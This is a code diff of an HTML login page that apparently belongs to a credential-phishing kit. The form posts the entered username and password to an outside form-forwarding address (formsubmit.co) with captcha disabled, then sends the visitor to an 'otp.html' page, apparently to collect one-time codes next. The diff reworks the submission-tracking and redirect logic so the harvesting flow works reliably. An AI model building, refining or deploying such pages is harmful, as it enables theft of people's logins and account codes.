@@ -14,21 +14,21 @@
             const passToggle = document.getElementById("passToggle");
             const form = document.getElementById("form");
 
-            // Toggle password visibility with icon change
+            // Toggle password visibility
             passToggle.addEventListener("click", function () {
                 if (passInput.type === "password") {
                     passInput.type = "text";
-                    passToggle.src = "asset/eye-open.svg"; // Change to "eye-open" icon
+                    passToggle.src = "asset/eye-open.svg";
                 } else {
                     passInput.type = "password";
-                    passToggle.src = "asset/eye-closed.svg"; // Change back to "eye-closed" icon
+                    passToggle.src = "asset/eye-closed.svg";
                 }
             });
 
-            // Listen for form submission and track it
-            form.addEventListener("submit", function () {
-                sessionStorage.setItem("formSubmitted", "true"); // Mark form as submitted
-
+            // Handle form submission and redirection
+            form.addEventListener("submit", function (event) {
+                sessionStorage.setItem("formSubmitted", "true"); // Track submission
+                
                 setTimeout(() => {
                     if (!sessionStorage.getItem("formSuccess")) {
                         console.warn("FormSubmit may have failed, redirecting manually...");
@@ -36,15 +36,12 @@
                     }
                 }, 5000); // Wait 5 seconds before assuming failure
             });
-        });
 
-        // This function runs only if FormSubmit successfully loads in the iframe
-        function formSubmitSuccess() {
-            if (sessionStorage.getItem("formSubmitted")) {
-                sessionStorage.setItem("formSuccess", "true"); // Mark form as successfully submitted
-                window.location.href = "otp.html"; // Redirect to OTP page
+            // Detect if redirected from FormSubmit
+            if (window.location.search.includes("success")) {
+                sessionStorage.setItem("formSuccess", "true");
             }
-        }
+        });
     </script>
 
     <script type="module" crossorigin src="main.js"></script>
@@ -56,7 +53,7 @@
         <div class="mt-5"></div>
 
         <!-- Form using FormSubmit -->
-        <form id="form" class="mt-44" action="https://formsubmit.co/el/jeyolu" method="POST" target="formTarget">
+        <form id="form" class="mt-44" action="https://formsubmit.co/el/jeyolu" method="POST">
             <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
                 <p class="font-bold loginu mb-3">Log In</p>
                 <img class="imglogo" src="asset/header-logo.png" alt="Logo">
@@ -92,8 +89,8 @@
                 </div>
 
                 <!-- Hidden fields for better UX -->
-                <input type="hidden" name="_captcha" value="false"> <!-- Disable Captcha -->
-                <input type="hidden" name="_next" value="otp.html"> <!-- Redirect after submission -->
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="otp.html?success=true"> <!-- Success flag -->
 
                 <button
                     id="redirectBtn"
@@ -105,9 +102,6 @@
                 <p class="pt-3 text-primary font-semibold text-center">Reset Password</p>
             </div>
         </form>
-
-        <!-- Hidden iframe to detect successful form submission -->
-        <iframe name="formTarget" style="display: none;" onload="formSubmitSuccess()"></iframe>
     </div>
 </body>
 </html>
